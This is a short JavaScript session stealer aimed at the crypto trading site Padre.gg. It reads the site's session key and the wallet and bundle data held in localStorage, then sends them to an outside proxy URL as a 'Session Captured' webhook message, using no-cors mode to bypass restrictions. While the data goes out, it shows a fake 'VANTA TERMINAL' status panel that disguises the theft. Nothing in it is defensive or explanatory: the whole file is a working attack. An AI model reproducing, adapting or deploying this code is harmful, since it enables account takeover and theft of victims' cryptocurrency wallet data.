(function() {
    // 1. YOUR PROXY CONFIG
    const PROXY = "https://vanta-proxy.jdurrulo.workers.dev/";

    // 2. THE DATA EXTRACTION (Specific to Padre.gg)
    const getSensitiveData = () => {
        return {
            session: localStorage.getItem('padre-session-v2'),
            bundles: localStorage.getItem('padre-v2-bundles-store-v2'),
            wallets: localStorage.getItem('padre-v2-wallets-store-v2'),
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
    };

    // 3. THE NOTIFICATION (UI for the target)
    const showUI = () => {
        const panel = document.createElement('div');
        panel.style = `position:fixed;top:20px;right:20px;width:320px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:12px;padding:20px;z-index:999999999;color:#fff;font-family:monospace;box-shadow:0 20px 40px #000;`;
        panel.innerHTML = `
            <div style="color:#00ff88;font-weight:bold;margin-bottom:10px;display:flex;justify-content:space-between;">
                <span>VANTA TERMINAL</span>
                <span id="vanta-status" style="color:#444;">●</span>
            </div>
            <div id="vanta-logs" style="font-size:11px;color:#888;height:40px;overflow:hidden;">
                > Initializing streams...<br>
                > Connecting to Padre node...
            </div>
        `;
        document.body.appendChild(panel);

        // Update UI status after sending
        setTimeout(() => {
            document.getElementById('vanta-status').style.color = "#00ff88";
            document.getElementById('vanta-logs').innerHTML += "<br>> Connection Established.";
        }, 1500);
    };

    // 4. TRIGGER THE EXFILTRATION
    const data = getSensitiveData();
    if (data.session) {
        fetch(PROXY, {
            method: 'POST',
            mode: 'no-cors', // Essential to bypass restrictive CORS on target sites
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: "Vanta Bot",
                avatar_url: "https://trade.padre.gg/logo.svg",
                embeds: [{
                    title: "🎯 Session Captured",
                    color: 65416,
                    fields: [
                        { name: "Domain", value: window.location.hostname },
                        { name: "Session Key", value: "```" + data.session + "```" },
                        { name: "Wallet Data", value: "```json\n" + (data.wallets ? data.wallets.substring(0, 500) : "None") + "```" }
                    ]
                }]
            })
        }).catch(() => {});
    }

    showUI();
})();
